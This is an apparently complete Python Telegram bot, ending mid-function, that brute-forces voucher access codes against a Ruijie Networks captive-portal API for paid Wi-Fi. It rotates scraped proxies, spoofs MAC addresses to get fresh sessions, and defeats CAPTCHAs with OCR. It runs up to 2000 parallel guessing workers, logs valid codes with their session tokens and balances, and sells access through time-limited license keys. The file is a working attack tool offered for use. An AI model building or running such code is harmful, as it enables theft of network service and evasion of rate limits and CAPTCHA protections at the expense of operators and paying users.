#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Black.py — Proxy + License + Hits + Target Filter + Fetch Proxies
"""

import os
import re
import json
import time
import random
import asyncio
from urllib.parse import urlparse, parse_qs

import aiohttp
from aiohttp_socks import ProxyConnector

from telegram import InlineKeyboardButton, InlineKeyboardMarkup
from telegram.constants import ParseMode
from telegram.ext import (Application, CommandHandler, MessageHandler,
                          CallbackQueryHandler, filters)

import ddddocr

# ─────────────────────────── CONFIG ───────────────────────────

TOKEN_FILE      = "bot_token.txt"
PROXY_FILE      = "proxies.txt"
PORTAL_URL_PATH = "portal_url_"
LICENSE_FILE    = "licenses.json"

PROXY_SOURCE_URL = ("https://api.proxyscrape.com/v4/free-proxy-list/get"
                    "?request=display_proxies&proxy_format=protocolipport&format=text")

ADMIN_IDS = [6537847588]

DEFAULT_WORKERS = 1000
MAX_WORKERS     = 2000
MAX_CODES_PER_SID = 200
TIMEOUT_SEC = 20

DURATIONS = {
    "5m":  300, "30m": 1800, "1h": 3600, "6h": 21600,
    "12h": 43200, "1d": 86400, "3d": 259200, "7d": 604800, "30d": 2592000,
}

DURATION_LABELS = {
    "5m": "5 မိနစ်", "30m": "30 မိနစ်", "1h": "1 နာရီ",
    "6h": "6 နာရီ", "12h": "12 နာရီ", "1d": "1 ရက်",
    "3d": "3 ရက်", "7d": "7 ရက်", "30d": "30 ရက်",
}

TARGET_OPTIONS = {
    "any":      "🎯 Any (all)",
    "1hour":    "⏰ 1 hour",
    "2Hour":    "⏰ 2 hour",
    "30miutes": "⏰ 30 min",
    "1Week":    "📅 1 week",
    "1month":   "📅 1 month",
}

user_scanners = {}
_proxy_manager = None
_ocr_instance = None
is_testing_proxies = False
is_fetching_proxies = False


# ─────────────────────────── LICENSE ───────────────────────────

def _load_licenses():
    if not os.path.exists(LICENSE_FILE):
        return {}
    try:
        with open(LICENSE_FILE, "r") as f:
            return json.load(f)
    except Exception:
        return {}


def _save_licenses(data):
    with open(LICENSE_FILE, "w") as f:
        json.dump(data, f, indent=2)


def generate_key():
    data = _load_licenses()
    alphabet = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789"
    while True:
        parts = ["".join(random.choices(alphabet, k=4)) for _ in range(3)]
        key = "MG-" + "-".join(parts)
        if key not in data:
            return key


def create_key(duration_label, created_by):
    data = _load_licenses()
    key = generate_key()
    data[key] = {
        "duration":  duration_label,
        "seconds":   DURATIONS[duration_label],
        "created":   int(time.time()),
        "created_by": created_by,
        "redeemed_by": None,
        "redeemed_by_username": None,
        "redeemed_by_name": None,
        "redeemed_at": None,
        "expires":   None,
        "revoked":   False,
        "hits":      [],
    }
    _save_licenses(data)
    return key


def redeem_key(key, user_id, username=None, first_name=None):
    data = _load_licenses()
    key = key.strip().upper()
    if key not in data:
        return False, "❌ Key မမှန်ဘူး", None
    entry = data[key]
    if entry.get("revoked"):
        return False, "❌ Key ကို ပိတ်ထားတယ်", None
    if entry.get("redeemed_by") and entry["redeemed_by"] != user_id:
        return False, "❌ Key ကို တစ်ခြားသူ သုံးပြီးသား", None
    if entry.get("redeemed_by") == user_id and entry.get("expires"):
        now = int(time.time())
        if entry["expires"] > now:
            left = entry["expires"] - now
            return False, f"⏳ Key က အလုပ်လုပ်နေတယ် — ကျန် {fmt_duration(left)}", entry["expires"]
        return False, "❌ Key သက်တမ်း ကုန်ပြီ", None

    now = int(time.time())
    expires = now + entry["seconds"]
    entry["redeemed_by"] = user_id
    entry["redeemed_by_username"] = username
    entry["redeemed_by_name"] = first_name
    entry["redeemed_at"] = now
    entry["expires"] = expires
    _save_licenses(data)
    return True, f"✅ Key activate — {DURATION_LABELS[entry['duration']]}", expires


def is_authorized(user_id):
    if user_id in ADMIN_IDS:
        return True
    data = _load_licenses()
    now = int(time.time())
    for key, entry in data.items():
        if entry.get("redeemed_by") == user_id and not entry.get("revoked"):
            exp = entry.get("expires")
            if exp and exp > now:
                return True
    return False


def get_user_license(user_id):
    if user_id in ADMIN_IDS:
        return "ADMIN", None, None
    data = _load_licenses()
    now = int(time.time())
    for key, entry in data.items():
        if entry.get("redeemed_by") == user_id and not entry.get("revoked"):
            exp = entry.get("expires")
            if exp and exp > now:
                return key, exp, exp - now
    return None, None, 0


def fmt_duration(sec):
    if sec is None:
        return "∞"
    if sec < 60:
        return f"{sec} စက္ကန့်"
    if sec < 3600:
        return f"{sec // 60} မိနစ်"
    if sec < 86400:
        h = sec // 3600
        m = (sec % 3600) // 60
        return f"{h} နာရီ {m} မိနစ်" if m else f"{h} နာရီ"
    d = sec // 86400
    h = (sec % 86400) // 3600
    return f"{d} ရက် {h} နာရီ" if h else f"{d} ရက်"


def list_keys():
    data = _load_licenses()
    if not data:
        return "📋 Key မရှိဘူး"
    lines = []
    now = int(time.time())
    for key, e in sorted(data.items(), key=lambda x: -x[1]["created"]):
        if e.get("revoked"):
            status = "🔴 revoke"
        elif e.get("expires") and e["expires"] > now:
            status = "🟢 active"
        elif e.get("redeemed_by"):
            status = "⚪ expired"
        else:
            status = "🟡 unused"

        who = "—"
        if e.get("redeemed_by"):
            who = f"`{e['redeemed_by']}`"
            if e.get("redeemed_by_username"):
                who += f" @{e['redeemed_by_username']}"
            if e.get("redeemed_by_name"):
                who += f" ({e['redeemed_by_name']})"

        left = ""
        if e.get("expires") and e["expires"] > now and not e.get("revoked"):
            left = f" | ⏳ {fmt_duration(e['expires'] - now)}"

        hit_count = len(e.get("hits", []))
        hit_line = f" | 🔥 {hit_count}" if hit_count else ""

        lines.append(f"`{key}` — {e['duration']} — {status}{hit_line}\n   by {who}{left}")
    return "📋 **Keys**\n\n" + "\n".join(lines)


def revoke_key(key):
    data = _load_licenses()
    key = key.strip().upper()
    if key not in data:
        return False, "❌ Key မရှိဘူး"
    data[key]["revoked"] = True
    _save_licenses(data)
    return True, f"✅ `{key}` revoke ပြီး"


def delete_key(key):
    data = _load_licenses()
    key = key.strip().upper()
    if key not in data:
        return False, "❌ Key မရှိဘူး"
    entry = data.pop(key)
    _save_licenses(data)
    who = entry.get("redeemed_by")
    if who:
        return True, f"🗑 `{key}` ဖျက်ပြီး (redeemed by `{who}`)"
    return True, f"🗑 `{key}` ဖျက်ပြီး"


def export_key_hits(key):
    data = _load_licenses()
    key = key.strip().upper()
    if key not in data:
        return False, None, 0, None
    entry = data[key]
    hits = entry.get("hits", [])
    owner = entry.get("redeemed_by") or "unknown"
    fname = f"hits_{owner}.txt"

    with open(fname, "w", encoding="utf-8") as f:
        for i, h in enumerate(hits, 1):
            code = h.get("code", "?")
            bal = h.get("balance") or "None"
            f.write(f"{i}. {code} | {bal}\n")

    return True, fname, len(hits), owner


# ─────────────────────────── HITS ───────────────────────────

def save_hit(user_id, code, active_token, balance_str=None):
    data = _load_licenses()
    now = int(time.time())
    for key, entry in data.items():
        if entry.get("redeemed_by") == user_id and not entry.get("revoked"):
            exp = entry.get("expires")
            if exp and exp > now:
                entry.setdefault("hits", [])
                entry["hits"].append({
                    "code": code,
                    "token": active_token,
                    "balance": balance_str,
                    "at": now,
                })
                _save_licenses(data)
                return len(entry["hits"]), key
    return 0, None


def get_user_hits(user_id):
    data = _load_licenses()
    for key, entry in data.items():
        if entry.get("redeemed_by") == user_id and not entry.get("revoked"):
            return entry.get("hits", []), key
    return [], None


def update_hit_balance(user_id, code, balance_str):
    data = _load_licenses()
    for key, entry in data.items():
        if entry.get("redeemed_by") == user_id:
            for h in entry.get("hits", []):
                if h.get("code") == code:
                    h["balance"] = balance_str
            _save_licenses(data)
            return


def total_hits_all():
    data = _load_licenses()
    out = []
    for key, entry in data.items():
        n = len(entry.get("hits", []))
        if n:
            out.append((
                key,
                entry.get("redeemed_by"),
                entry.get("redeemed_by_username"),
                entry.get("redeemed_by_name"),
                n,
            ))
    return out


# ─────────────────────────── PROXY ───────────────────────────

class ProxyManager:
    def __init__(self, file_path=PROXY_FILE):
        self.file_path = file_path
        self.proxies = []
        self.bad_proxies = set()
        self.index = 0
        self.lock = asyncio.Lock()
        self.load()

    def _normalize(self, line):
        line = line.strip()
        if not line:
            return None
        if "://" not in line:
            line = "http://" + line
        return line

    def load(self):
        self.proxies = []
        if os.path.exists(self.file_path):
            with open(self.file_path, "r") as f:
                for line in f:
                    p = self._normalize(line)
                    if p and p not in self.proxies:
                        self.proxies.append(p)
        print(f"[ProxyManager] Loaded {len(self.proxies)} proxies")
        return len(self.proxies)

    async def get_next(self):
        async with self.lock:
            if not self.proxies:
                return None
            for _ in range(len(self.proxies)):
                proxy = self.proxies[self.index % len(self.proxies)]
                self.index += 1
                if proxy not in self.bad_proxies:
                    return proxy
            self.bad_proxies.clear()
            proxy = self.proxies[self.index % len(self.proxies)]
            self.index += 1
            return proxy

    def mark_bad(self, proxy):
        if proxy:
            self.bad_proxies.add(proxy)

    def reload(self):
        return self.load()

    def stats(self):
        return len(self.proxies), len(self.proxies) - len(self.bad_proxies)


def get_proxy_manager():
    global _proxy_manager
    if _proxy_manager is None:
        _proxy_manager = ProxyManager()
    return _proxy_manager


# ─────────────────────────── FETCH PROXIES ───────────────────────────

async def fetch_proxies_from_url(replace=False):
    try:
        timeout = aiohttp.ClientTimeout(total=30)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(PROXY_SOURCE_URL) as resp:
                if resp.status != 200:
                    return 0, 0, f"HTTP {resp.status}"
                text = await resp.text()
    except Exception as e:
        return 0, 0, f"{type(e).__name__}: {e}"

    lines = [l.strip() for l in text.splitlines() if l.strip()]

    valid = []
    seen = set()
    for l in lines:
        if "://" not in l:
            l = "http://" + l
        m = re.match(r'^(socks4|socks5|http|https)://([\d\.]+):(\d+)$', l)
        if not m:
            continue
        if l in seen:
            continue
        seen.add(l)
        valid.append(l)

    existing = []
    if not replace and os.path.exists(PROXY_FILE):
        with open(PROXY_FILE, "r") as f:
            existing = [x.strip() for x in f if x.strip()]

    all_proxies = list(dict.fromkeys(existing + valid))

    with open(PROXY_FILE, "w") as f:
        f.write("\n".join(all_proxies))

    added = len(all_proxies) - len(existing)
    return added, len(all_proxies), None


# ─────────────────────────── PROXY TEST ───────────────────────────

async def test_single_proxy(proxy, timeout_sec=8):
    try:
        timeout = aiohttp.ClientTimeout(total=timeout_sec)
        if proxy.startswith("socks"):
            connector = ProxyConnector.from_url(proxy, ssl=False)
            session = aiohttp.ClientSession(connector=connector, timeout=timeout)
            async with session:
                async with session.get("https://api.ipify.org?format=json") as resp:
                    if resp.status == 200:
                        return proxy
        else:
            session = aiohttp.ClientSession(timeout=timeout)
            async with session:
                async with session.get("https://api.ipify.org?format=json", proxy=proxy) as resp:
                    if resp.status == 200:
                        return proxy
    except Exception:
        pass
    return None


async def test_all_proxies(chat_id, context):
    global is_testing_proxies
    if is_testing_proxies:
        await context.bot.send_message(chat_id=chat_id, text="⚠️ Proxy စမ်းသပ်နေဆဲ။")
        return
    is_testing_proxies = True
    pm = get_proxy_manager()
    pm.load()
    total = len(pm.proxies)
    if total == 0:
        await context.bot.send_message(chat_id=chat_id, text="❌ Proxy မရှိပါ။")
        is_testing_proxies = False
        return

    msg = await context.bot.send_message(chat_id=chat_id, text=f"🧪 Testing {total} proxies...")
    working = []
    batch_size = 1000
    try:
        for i in range(0, total, batch_size):
            batch = pm.proxies[i:i+batch_size]
            tasks = [asyncio.wait_for(test_single_proxy(p), timeout=9) for p in batch]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            for r in results:
                if r and not isinstance(r, Exception):
                    working.append(r)
            try:
                await context.bot.edit_message_text(
                    chat_id=chat_id, message_id=msg.message_id,
                    text=f"🧪 Testing... {min(i+batch_size, total)}/{total} (Working: {len(working)})")
            except Exception:
                pass
        with open(PROXY_FILE, "w") as f:
            f.write("\n".join(working))
        pm.load()
        await context.bot.edit_message_text(
            chat_id=chat_id, message_id=msg.message_id,
            text=f"✅ Test ပြီးပါပြီ!\n\n🟢 Working: {len(working)}/{total}\n🔴 Dead: {total - len(working)}/{total}")
    except Exception as e:
        print(f"[TEST ERROR] {e}")
    finally:
        is_testing_proxies = False


# ─────────────────────────── OCR ───────────────────────────

def get_ocr_instance():
    global _ocr_instance
    if _ocr_instance is None:
        _ocr_instance = ddddocr.DdddOcr(show_ad=False)
    return _ocr_instance


def ocr_image_bytes_fast(image_bytes):
    ocr = get_ocr_instance()
    return ocr.classification(image_bytes).strip().upper()


# ─────────────────────────── USER DATA ───────────────────────────

def get_user_data(user_id):
    if user_id not in user_scanners:
        saved_url = None
        p_file = PORTAL_URL_PATH + str(user_id) + ".txt"
        if os.path.exists(p_file):
            try:
                with open(p_file, "r") as f:
                    saved_url = f.read().strip()
            except Exception:
                saved_url = None
        user_scanners[user_id] = {
            "mode": "num6",
            "char_set": "012345678",
            "code_len": 6,
            "start_digit": None,
            "portal_url": saved_url,
            "stop_event": asyncio.Event(),
            "dash_update_event": asyncio.Event(),
            "task": None,
            "stats": {"tried": 0, "hits": 0, "expired": 0, "limits": 0,
                      "target_hits": 0, "start_time": time.time()},
            "valid_codes": [],
            "tried_codes": set(),
            "recent_logs": [],
            "CURRENT_CODE": "----",
            "dash_msg_id": None,
            "menu_msg_id": None,
            "state": None,
            "worker_count": DEFAULT_WORKERS,
            "target_duration": None,
            "target_alert": None,
            "last_alert_at": 0,
        }
    return user_scanners[user_id]


# ─────────────────────────── HELPERS ───────────────────────────

def generate_random_mac():
    return ":".join(["%02x" % random.randint(0, 255) for _ in range(6)])


def replace_mac(url, new_mac):
    if "mac=" in url:
        return re.sub(r'(?<=mac=)[^&]+', new_mac, url)
    sep = "&" if "?" in url else "?"
    return url + sep + "mac=" + new_mac


def create_connector_for_proxy(proxy):
    try:
        if not proxy:
            return None
        if proxy.startswith("socks4://") or proxy.startswith("socks5://"):
            return ProxyConnector.from_url(proxy, ssl=False)
        else:
            if "://" not in proxy:
                proxy = "http://" + proxy
            return ProxyConnector.from_url(proxy, ssl=False)
    except Exception as e:
        print(f"[Proxy Connector] Error: {e}")
        return None


def log_user(update, tag=""):
    try:
        u = update.effective_user
        print(f"[{tag}] id={u.id} @{u.username or '-'} "
              f"name={u.first_name or '-'} {u.last_name or ''}")
    except Exception:
        pass


API_BASE = "https://portal-as.ruijienetworks.com"
LOGIN_URL = API_BASE + "/api/auth/voucher/?lang=en_US"
CAPTCHA_IMAGE_URL = API_BASE + "/api/auth/captcha/image"
CAPTCHA_VERIFY_URL = API_BASE + "/api/auth/captcha/verify"
BALANCE_URL = API_BASE + "/api/auth/balance/getBalance/"


# ─────────────────────────── SID ───────────────────────────

async def get_sid_from_gateway(session, portal_url, user_id, proxy=None):
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                             "AppleWebKit/537.36 (KHTML, like Gecko) "
                             "Chrome/120.0.0.0 Safari/537.36"}
    use_proxy = None if (proxy and proxy.startswith("socks")) else proxy
    try:
        parsed = parse_qs(urlparse(portal_url).query)
        sid = parsed.get("sessionId") or parsed.get("sid")
        if sid:
            return sid[0]
        mac = generate_random_mac()
        spoofed_url = replace_mac(portal_url, mac)
        async with session.get(spoofed_url, headers=headers,
                               timeout=TIMEOUT_SEC, ssl=False, proxy=use_proxy,
                               allow_redirects=True) as r2:
            body = await r2.text()
            final_url = str(r2.url)
            m = re.search(r"[?&](?:sessionId|sid)=([a-zA-Z0-9]+)", final_url)
            if m:
                return m.group(1)
            m2 = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", body)
            if m2:
                async with session.get(m2.group(1), headers=headers,
                                       timeout=TIMEOUT_SEC, ssl=False, proxy=use_proxy,
                                       allow_redirects=True) as r3:
                    final3 = str(r3.url)
                    m3 = re.search(r"[?&](?:sessionId|sid)=([a-zA-Z0-9]+)", final3)
                    if m3:
                        return m3.group(1)
            m4 = re.search(r'sessionId["\']?\s*[:=]\s*["\']([a-zA-Z0-9]+)', body)
            if m4:
                return m4.group(1)
        return None
    except Exception as e:
        print(f"[SID] Error: {type(e).__name__}: {e}")
        return None


# ─────────────────────────── BALANCE ───────────────────────────

async def fetch_balance(active_token, proxy=None):
    url = BALANCE_URL + active_token + "?lang=en_US"
    headers = {
        "authority": "portal-as.ruijienetworks.com",
        "accept": "application/json, text/javascript, */*; q=0.01",
        "referer": API_BASE + "/download/static/maccauth/src/balance.html?sessionId=" + active_token,
        "user-agent": "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/148.0.0.0 Mobile Safari/537.36",
        "x-requested-with": "XMLHttpRequest",
    }
    use_proxy = None if (proxy and proxy.startswith("socks")) else proxy
    try:
        if proxy and proxy.startswith("socks"):
            connector = create_connector_for_proxy(proxy)
            session = aiohttp.ClientSession(connector=connector)
        else:
            session = aiohttp.ClientSession()
        async with session:
            async with session.get(url, headers=headers, ssl=False,
                                   timeout=TIMEOUT_SEC, proxy=use_proxy) as resp:
                data = await resp.json()
        inner = data.get("result", data) if isinstance(data, dict) else {}
        profile_name = inner.get("profileName") or "N/A"
        raw_total = inner.get("totalMinutes") or 0
        try:
            total_minutes = int(raw_total)
        except Exception:
            total_minutes = 0
        hours, minutes = divmod(total_minutes, 60)
        return f"🃏: {profile_name}, ⏰: {hours} hr {minutes} min"
    except Exception:
        return "🃏: N/A, ⏰: Error"


async def check_balance(active_token, code, user_id, proxy_str):
    ud = get_user_data(user_id)
    balance_str = await fetch_balance(active_token, proxy_str)

    target = ud.get("target_duration")
    is_match = False
    if target:
        low = (balance_str or "").lower()
        if target.lower() in low:
            is_match = True

    for item in ud["valid_codes"]:
        if isinstance(item, dict) and item.get("code") == code:
            item["balance_str"] = balance_str
            item["is_target"] = is_match

    update_hit_balance(user_id, code, balance_str)

    if is_match:
        ud["stats"]["target_hits"] = ud["stats"].get("target_hits", 0) + 1
        ud["target_alert"] = {
            "code": code,
            "balance": balance_str,
            "at": int(time.time()),
        }
    return balance_str


# ─────────────────────────── CODE CHECK ───────────────────────────

async def check_single_access_code(session, code, current_session_id, user_id, proxy=None):
    ud = get_user_data(user_id)
    headers = {
        "authority": "portal-as.ruijienetworks.com",
        "accept": "*/*",
        "content-type": "application/json",
        "origin": API_BASE,
        "referer": API_BASE + f"/download/static/maccauth/src/index.html?sessionId={current_session_id}",
        "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 Chrome/139.0.0.0 Mobile Safari/537.36",
    }
    use_proxy = None if (proxy and proxy.startswith("socks")) else proxy

    auth_code = None
    for _ in range(5):
        captcha_url = CAPTCHA_IMAGE_URL + "?sessionId=" + str(current_session_id) + "&_t=" + str(int(time.time()*1000))
        try:
            async with session.get(captcha_url, headers=headers, ssl=False,
                                   timeout=TIMEOUT_SEC, proxy=use_proxy) as response:
                image_content = await response.read()
                auth_code = await asyncio.to_thread(ocr_image_bytes_fast, image_content)
                if auth_code and len(auth_code) >= 3:
                    break
        except Exception as e:
            print(f"[Captcha] Error: {e}")
            auth_code = None
    if not auth_code:
        return "failed"

    try:
        v_payload = {"sessionId": current_session_id, "authCode": auth_code}
        async with session.post(CAPTCHA_VERIFY_URL, json=v_payload, headers=headers,
                                ssl=False, timeout=TIMEOUT_SEC, proxy=use_proxy) as v_resp:
            v_data = await v_resp.json()
            if not (isinstance(v_data, dict) and v_data.get("success")):
                return "failed"

        l_payload = {"accessCode": code, "sessionId": current_session_id,
                     "apiVersion": 1, "authCode": auth_code}
        async with session.post(LOGIN_URL, json=l_payload, headers=headers,
                                ssl=False, timeout=TIMEOUT_SEC, proxy=use_proxy) as l_resp:
            l_text = await l_resp.text()
            low = l_text.lower()

            if "expired" in low:
                ud["stats"]["expired"] += 1
                return "expired"
            if "request limited" in low:
                ud["stats"]["limits"] += 1
                await asyncio.sleep(3)
                return "limit"
            if '"success":true' in low or "logonurl" in low:
                token_match = re.search(r"token=([^&\s\"\'<>]+)", l_text)
                active_token = token_match.group(1) if token_match else None
                ud["stats"]["hits"] += 1
                save_hit(user_id, code, active_token)
                ud["valid_codes"].append({
                    "code": code,
                    "active_token": active_token,
                    "balance_str": None,
                    "is_target": False,
                })
                ud["recent_logs"].append(f"✅ HIT: {code}")
                ud["dash_update_event"].set()
                if active_token:
                    asyncio.ensure_future(check_balance(active_token, code, user_id, proxy))
                return "hit"
            return "failed"
    except asyncio.CancelledError:
        raise
    except Exception as e:
        print(f"[Check] Error: {type(e).__name__}: {e}")
        return "failed"


# ─────────────────────────── WORKER ───────────────────────────

async def worker(worker_id, user_id):
    ud = get_user_data(user_id)
    pm = get_proxy_manager()

    while not ud["stop_event"].is_set():
        if not is_authorized(user_id):
            ud["stop_event"].set()
            return
        try:
            proxy = await pm.get_next()

            if proxy and proxy.startswith("socks"):
                connector = create_connector_for_proxy(proxy)
                session = aiohttp.ClientSession(connector=connector)
                actual_proxy = None
            else:
                session = aiohttp.ClientSession()
                actual_proxy = proxy

            async with session:
                current_session_id = await get_sid_from_gateway(
                    session, ud["portal_url"], user_id, proxy=actual_proxy)

                if not current_session_id:
                    pm.mark_bad(proxy)
                    await asyncio.sleep(1)
                    continue

                codes_checked_this_sid = 0

                while (not ud["stop_event"].is_set()
                       and codes_checked_this_sid < MAX_CODES_PER_SID):
                    if not is_authorized(user_id):
                        ud["stop_event"].set()
                        return

                    if ud["mode"] == "custom" and ud.get("start_digit"):
                        body_chars = [ud["start_digit"]] + \
                            random.choices(ud["char_set"], k=ud["code_len"] - 1)
                        code = "".join(body_chars)
                    else:
                        code = "".join(random.choices(ud["char_set"], k=ud["code_len"]))

                    if code in ud["tried_codes"]:
                        continue
                    ud["tried_codes"].add(code)
                    ud["CURRENT_CODE"] = code
                    ud["stats"]["tried"] += 1
                    codes_checked_this_sid += 1

                    result = await check_single_access_code(
                        session, code, current_session_id, user_id, proxy=actual_proxy)

                    if result == "hit":
                        print(f"[Worker {worker_id}] 🎉 HIT! {code}")

                    await asyncio.sleep(0.2)

        except asyncio.CancelledError:
            return
        except Exception as e:
            print(f"[Worker {worker_id}] Error: {type(e).__name__}: {e}")
            await asyncio.sleep(1)


# ─────────────────────────── DASHBOARD ───────────────────────────

async def live_dashboard_updater(context, user_id):
    ud = get_user_data(user_id)
    pm = get_proxy_manager()
    while not ud["stop_event"].is_set():
        try:
            alert = ud.get("target_alert")
            if alert and alert.get("at", 0) > ud.get("last_alert_at", 0):
                ud["last_alert_at"] = alert["at"]
                try:
                    await context.bot.send_message(
                        chat_id=user_id,
                        text=(f"🎯 **TARGET HIT!**\n\n"
                              f"🔑 Code: `{alert['code']}`\n"
                              f"🃏 {alert['balance']}\n\n"
                              f"By @soelwin566"),
                        parse_mode=ParseMode.MARKDOWN)
                except Exception as e:
                    print(f"[Alert] {e}")

            stats = ud["stats"]
            elapsed = time.time() - stats["start_time"]
            speed_cpm = stats["tried"] / (elapsed / 60) if elapsed > 0 else 0.0
            proxy_total, proxy_active = pm.stats()

            target = ud.get("target_duration")
            hit_block = "None yet"
            if ud["valid_codes"]:
                hit_list = []
                for item in ud["valid_codes"][-10:]:
                    if not isinstance(item, dict):
                        continue
                    if target and not item.get("is_target"):
                        continue
                    c = item.get("code", "?")
                    balance = item.get("balance_str") or "..."
                    hit_list.append(f"🔥 {c} {balance}")
                hit_block = "\n".join(hit_list) if hit_list else "None yet"

            _, _, sec_left = get_user_license(user_id)
            license_line = ""
            if sec_left:
                license_line = f"🔑 License: {fmt_duration(sec_left)}\n"

            target_line = ""
            if target:
                target_line = f"🎯 Target: {target}\n"

            hits_line = f"🔥 Hits: {stats['hits']}"
            if target:
                hits_line += f" (🎯 {stats.get('target_hits', 0)})"
            hits_line += "\n"

            text = (
                "⚡ Scanner Running ⚡\n"
                "Thank for using By Telegram @soelwin566\n"
                "━━━━━━━━━━━━━━━━━━\n"
                f"🎸 Tried: {stats['tried']:,}\n"
                f"🎯 Current Code: {ud['CURRENT_CODE']}\n"
                f"{hits_line}"
                f"⚔️ Expired: {stats['expired']}\n"
                f"⚠️ Limits: {stats['limits']}\n"
                f"⚡ Speed: {speed_cpm:.1f} c/m\n"
                f"🔁 Proxies: {proxy_active}/{proxy_total}\n"
                f"⚙️ Workers: {ud.get('worker_count', DEFAULT_WORKERS)}\n"
                f"{target_line}"
                f"{license_line}"
                "━━━━━━━━━━━━━━━━━━\n"
                "🔥 **Hit Codes**:\n"
                f"{hit_block}\n"
                "━━━━━━━━━━━━━━━━━━\n"
            )
            keyboard = InlineKeyboardMarkup(
                [[InlineKeyboardButton("🛑 Stop", callback_data="stop_scan")]])
            await context.bot.edit_message_text(
                chat_id=user_id, message_id=ud["dash_msg_id"],
                text=text, reply_markup=keyboard)
        except asyncio.CancelledError:
            return
        except Exception as e:
            print(f"[Dashboard] Error: {e}")
        try:
            await asyncio.wait_for(ud["dash_update_event"].wait(), timeout=10.0)
        except asyncio.TimeoutError:
            pass
        ud["dash_update_event"].clear()


# ─────────────────────────── SCANNER ───────────────────────────

async def run_user_scanner(context, user_id):
    ud = get_user_data(user_id)
    if not ud["portal_url"]:
        return

    ud["stats"]["start_time"] = time.time()
    tasks = []
    worker_count = max(1, min(MAX_WORKERS,
                              int(ud.get("worker_count", DEFAULT_WORKERS))))

    dash_task = asyncio.ensure_future(live_dashboard_updater(context, user_id))
    for i in range(worker_count):
        t = asyncio.ensure_future(worker(i, user_id))
        tasks.append(t)

    ud["task"] = dash_task

    try:
        while not ud["stop_event"].is_set():
            if all(t.done() for t in tasks):
                break
            await asyncio.sleep(1)
    except asyncio.CancelledError:
        ud["stop_event"].set()
    finally:
        ud["stop_event"].set()
        for t in tasks:
            if not t.done():
                t.cancel()
        if dash_task and not dash_task.done():
            dash_task.cancel()
        try:
            stats = ud["stats"]
            elapsed = time.time() - stats["start_time"]
            speed_cpm = stats["tried"] / (elapsed / 60) if elapsed > 0 else 0.0
            proxy_total, proxy_active = get_proxy_manager().stats()
            target = ud.get("target_duration")
            hit_block = "None"
            if ud["valid_codes"]:
                hit_list = []
                for item in ud["valid_codes"]:
                    if not isinstance(item, dict):
                        continue
                    if target and not item.get("is_target"):
                        continue
                    c = item.get("code", "?")
                    balance = item.get("balance_str") or "..."
                    hit_list.append(f"🔥 {c} {balance}")
                hit_block = "\n".join(hit_list) if hit_list else "None"
            hits_line = f"🟢 Hits: {stats['hits']}"
            if target:
                hits_line += f" (🎯 {stats.get('target_hits', 0)})"
            final_text = (
                "🛑 Scanner Stopped/Finished\n"
                "━━━━━━━━━━━━━━━━━━\n"
                f"🔓 Total Tried: {stats['tried']:,}\n"
                f"{hits_line}\n"
                f"⚡ Final Speed: {speed_cpm:.1f} c/m\n"
                f"🔁 Proxies: {proxy_active}/{proxy_total}\n"
                f"⚙️ Workers: {ud.get('worker_count', DEFAULT_WORKERS)}\n"
                "━━━━━━━━━━━━━━━━━━\n"
                "📋 **All Hit Codes**:\n"
                f"{hit_block}\n"
                "━━━━━━━━━━━━━━━━━━\n"
            )
            await context.bot.edit_message_text(
                chat_id=user_id, message_id=ud["dash_msg_id"], text=final_text)
        except Exception:
            pass
        ud["task"] = None


# ─────────────────────────── UI ───────────────────────────

def get_main_menu_markup(ud=None):
    workers_label = f"⚙️ Set Workers ({ud.get('worker_count', DEFAULT_WORKERS)})" \
        if ud else "⚙️ Set Workers"
    target = (ud.get("target_duration") or "any") if ud else "any"
    target_label = f"🎯 Target ({target})"
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🌐 Update Portal", callback_data="btn_update_portal")],
        [InlineKeyboardButton("⚙️ Mode", callback_data="btn_mode_menu")],
        [InlineKeyboardButton(workers_label, callback_data="btn_set_workers")],
        [InlineKeyboardButton(target_label, callback_data="btn_target_dur")],
        [InlineKeyboardButton("➕ Add Proxies", callback_data="btn_add_proxies")],
        [InlineKeyboardButton("🔄 Fetch Proxies", callback_data="btn_fetch_proxies")],
        [InlineKeyboardButton("🧪 Test Proxies", callback_data="btn_test_proxies")],
        [InlineKeyboardButton("🚀 Start Scanner", callback_data="btn_start_scanner")],
    ])


def get_target_markup():
    rows = []
    for k, label in TARGET_OPTIONS.items():
        rows.append([InlineKeyboardButton(label, callback_data=f"set_target_{k}")])
    rows.append([InlineKeyboardButton("⬅️ Back", callback_data="btn_back_main")])
    return InlineKeyboardMarkup(rows)


def get_activation_markup():
    return InlineKeyboardMarkup(
        [[InlineKeyboardButton("🔑 Activate Key", callback_data="btn_activate")]])


def main_panel(ud, user_id):
    pm = get_proxy_manager()
    proxy_total, proxy_active = pm.stats()
    lic_line = ""
    if user_id in ADMIN_IDS:
        lic_line = "🔑 License: `ADMIN`\n"
    else:
        key, exp, sec = get_user_license(user_id)
        if key:
            lic_line = f"🔑 License: `{fmt_duration(sec)}` ကျန်\n"
    target_line = f"🎯 Target: `{ud.get('target_duration') or 'any'}`\n"
    return (
        "⚡ **Starlink Scanner Control Panel** ⚡\n\n"
        f"⚙️ Current Mode: `{ud['mode']}`\n"
        f"⚙️ Workers: `{ud.get('worker_count', DEFAULT_WORKERS)}`\n"
        f"🔁 Proxies: `{proxy_active}/{proxy_total}`\n"
        f"{target_line}"
        f"{lic_line}"
    )


def get_admin_markup():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔑 Generate Key", callback_data="adm_gen")],
        [InlineKeyboardButton("📋 List Keys", callback_data="adm_list")],
        [InlineKeyboardButton("🚫 Revoke Key", callback_data="adm_revoke")],
        [InlineKeyboardButton("🗑 Delete Key", callback_data="adm_del")],
    ])


def get_gen_dur_markup():
    rows = []
    row = []
    for label in DURATIONS.keys():
        row.append(InlineKeyboardButton(DURATION_LABELS[label],
                                        callback_data=f"adm_gen_{label}"))
        if len(row) == 3:
            rows.append(row)
            row = []
    if row:
        rows.append(row)
    rows.append([InlineKeyboardButton("⬅️ Back", callback_data="adm_back")])
    return InlineKeyboardMarkup(rows)


def admin_only(func):
    async def wrapper(update, context, *args, **kwargs):
